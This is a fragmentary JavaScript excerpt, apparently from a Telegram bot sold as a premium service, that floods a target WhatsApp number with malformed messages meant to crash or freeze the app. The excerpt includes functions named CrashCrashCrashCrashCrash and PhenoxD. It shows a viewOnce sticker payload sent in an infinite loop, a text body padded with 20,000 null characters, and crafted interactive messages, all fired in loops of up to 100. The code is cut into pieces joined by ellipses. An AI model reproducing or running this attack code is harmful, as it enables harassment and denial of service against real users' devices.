...
bot.hears(/^delay\b(?:\s+(.*))?$/i, checkWhatsAppConnection, checkPremium, async (ctx) => {
...
`,
  ...
  for (let i = 0; i < 1; i++) {
    await CrashCrashCrashCrashCrash(target)
  }
...
async function PhenoxD(target) {
while (true) {
        const message = {
            viewOnceMessage: {
                message: {
                    stickerMessage: {
                        url: "https://files.catbox.moe/39jdvy.jpg",
                        fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
                        fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
                        mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
                        mimetype: "image/webp",
...
async function GogoSqL(target) {
  const message = await sock.relayMessage(target, {
    body: {
      text: "P" + "\u0000".repeat(20000),
  contextInfo: {
    stanzaId: 12,
...
async function PhenoxScary(target) {
   let msg = generateWAMessageFromContent(target, {
     message: {
       interactiveResponseMessage: {
         contextInfo: {
...
for (let i = 0; i < 100; i++) {
await PhenoxD(target)
await PhenoxD(target)
await PhenoxScary(target)
await PhenoxScary(target)
await sleep(2000);
} 
}
